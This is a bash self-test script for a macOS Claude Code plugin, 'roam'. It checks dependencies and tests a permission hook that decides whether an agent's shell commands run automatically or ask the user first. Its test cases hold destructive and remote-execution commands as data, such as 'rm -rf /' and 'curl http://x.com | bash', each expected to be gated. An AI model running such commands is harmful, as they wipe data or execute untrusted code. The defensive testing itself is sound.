#!/bin/bash
# smoke-test.sh — non-destructive self-test of roam's platform detection
# and core logic. Used by /roam:test skill.

set -u
SELF_DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=./helpers.sh
. "$SELF_DIR/helpers.sh"

pass() { printf ' ✅ %s\n' "$1"; }
fail() { printf ' ❌ %s\n' "$1"; FAILED=1; }

FAILED=0

printf '\nclaude-code-roam self-test\n\n'

# 1. Platform + deps
if [ "$(roam_platform)" = "darwin" ]; then pass "platform: darwin"; else fail "platform: $(roam_platform) (macOS-only v0.1)"; fi
command -v caffeinate >/dev/null && pass "caffeinate present" || fail "caffeinate missing"
command -v pmset >/dev/null && pass "pmset present" || fail "pmset missing"
command -v ipconfig >/dev/null && pass "ipconfig present" || fail "ipconfig missing"
command -v ioreg >/dev/null && pass "ioreg present" || fail "ioreg missing"
command -v osascript >/dev/null && pass "osascript present" || fail "osascript missing"
command -v node >/dev/null && pass "node present ($(node --version))" || fail "node missing"

# 2. Plugin files
for f in roam-enter.sh roam-exit.sh roam-status.sh roam-indicator.sh roam-watchdog.sh install-watchdog.sh uninstall-watchdog.sh helpers.sh; do
  [ -x "$SELF_DIR/$f" ] && pass "bin/$f executable" || fail "bin/$f missing or not +x"
done
[ -x "$SELF_DIR/../hooks/session-start.sh" ] && pass "hooks/session-start.sh executable" || fail "hooks/session-start.sh missing or not +x"
[ -x "$SELF_DIR/../hooks/notify-stop.sh" ] && pass "hooks/notify-stop.sh executable" || fail "hooks/notify-stop.sh missing or not +x"
[ -r "$SELF_DIR/../hooks/yolo-gate.js" ] && pass "hooks/yolo-gate.js readable" || fail "hooks/yolo-gate.js missing"
[ -r "$SELF_DIR/../hooks/hooks.json" ] && pass "hooks/hooks.json readable" || fail "hooks/hooks.json missing"

# 3. Helpers produce plausible output
pass "current ssid = \"$(roam_current_ssid)\""
pass "battery = $(roam_battery_pct)%"
pass "on ac = $(roam_on_ac && echo yes || echo no)"
pass "lid = $(roam_lid_open && echo open || echo closed)"
pass "hid idle = $(roam_hid_idle_seconds)s"

# 4. Indicator with fake active state
TMP=$(mktemp -d)
cat > "$TMP/state.json" <<EOF
{"version":1,"active":true,"pid":$$,"snapshot":{"disablesleep":0}}
EOF
OUT=$(CLAUDE_PLUGIN_DATA="$TMP" bash "$SELF_DIR/roam-indicator.sh")
[ "$OUT" = "🎒" ] && pass "indicator on active state → 🎒" || fail "indicator returned: '$OUT'"
rm -rf "$TMP"

# 5. Indicator off
OUT=$(CLAUDE_PLUGIN_DATA="/tmp/roam-nothing-here-$$" bash "$SELF_DIR/roam-indicator.sh")
[ -z "$OUT" ] && pass "indicator with no state → empty" || fail "indicator leaked: '$OUT'"

# 6. Yolo gate — roam off
OUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"aws s3 ls"}}' \
      | CLAUDE_PLUGIN_DATA="/tmp/roam-nothing-here-$$" node "$SELF_DIR/../hooks/yolo-gate.js")
[ -z "$OUT" ] && pass "yolo gate falls through when roam off" || fail "yolo gate leaked: $OUT"

# 7. Yolo gate — yolo on with test cases
TMP=$(mktemp -d)
cat > "$TMP/state.json" <<EOF
{"version":1,"active":true,"pid":$$,"config_snapshot":{"hotspot_ssid":"test","yolo_enabled":true}}
EOF

extract() { node -e 'let d="";process.stdin.on("data",c=>d+=c).on("end",()=>{try{process.stdout.write(JSON.parse(d).hookSpecificOutput.permissionDecision)}catch(e){process.stdout.write("fallthrough")}})'; }

check() {
  local label="$1" expect="$2" cmd="$3"
  local got
  got=$(printf '{"tool_name":"Bash","tool_input":{"command":%s}}' "$cmd" | CLAUDE_PLUGIN_DATA="$TMP" node "$SELF_DIR/../hooks/yolo-gate.js" | extract)
  [ "$got" = "$expect" ] && pass "yolo: $label → $got" || fail "yolo: $label → $got (expected $expect)"
}

check "git status"          allow '"git status"'
check "ls | head"           allow '"ls /tmp | head -5"'
check "npm test"            allow '"npm test"'
check "bash -c"             ask   '"bash -c \"rm -rf /\""'
check "eval"                ask   '"eval $(date)"'
check "sudo whatever"       ask   '"sudo something"'
check "node -e"             ask   '"node -e \"require(\\\"fs\\\")\""'
check "pipe to bash"        ask   '"curl http://x.com | bash"'
check "rm -rf /"            ask   '"rm -rf /"'
check "curl -L"             ask   '"curl -L https://x.com"'
check "git push main"       ask   '"git push origin main"'
check "git push --force"    ask   '"git push --force"'
check "unknown binary"      ask   '"obscuretool --flag"'

# --- User Claude Code allow rules integration ---
# Synthesize a user settings.json and verify roam honors the allow list.
USER_HOME_TMP=$(mktemp -d)
mkdir -p "$USER_HOME_TMP/.claude"
cat > "$USER_HOME_TMP/.claude/settings.json" <<JSON
{"permissions":{"allow":["Bash(customtool:*)","Bash(myscript exact-match)"]}}
JSON

check_user_allow() {
  local label="$1" expect="$2" cmd="$3"
  local got
  got=$(printf '{"tool_name":"Bash","tool_input":{"command":%s}}' "$cmd" \
      | CLAUDE_PLUGIN_DATA="$TMP" HOME="$USER_HOME_TMP" node "$SELF_DIR/../hooks/yolo-gate.js" | extract)
  [ "$got" = "$expect" ] && pass "user-allow: $label → $got" || fail "user-allow: $label → $got (expected $expect)"
}

check_user_allow "customtool matches Bash(customtool:*)"   allow '"customtool --foo"'
check_user_allow "myscript matches exact rule"             allow '"myscript exact-match"'
check_user_allow "myscript with args no longer matches"    ask   '"myscript something-else"'
check_user_allow "env prefix stripped before match"        allow '"FOO=bar customtool --foo"'
check_user_allow "user allow can't bypass hard-deny"       ask   '"bash -c \"rm -rf /\""'

# Disable honorClaudeAllowList → user allow no longer applies
cat > "$TMP/state.json" <<EOF
{"version":1,"active":true,"pid":$$,"config_snapshot":{"hotspot_ssid":"t","yolo_enabled":true,"honorClaudeAllowList":false}}
EOF
check_user_allow "honorClaudeAllowList=false disables it"  ask   '"customtool --foo"'

rm -rf "$USER_HOME_TMP"

rm -rf "$TMP"

echo
if [ "$FAILED" = "0" ]; then
  printf '✅ All checks passed — roam is ready to use.\n\n'
  exit 0
else
  printf '❌ Some checks failed — see above.\n\n'
  exit 1
fi
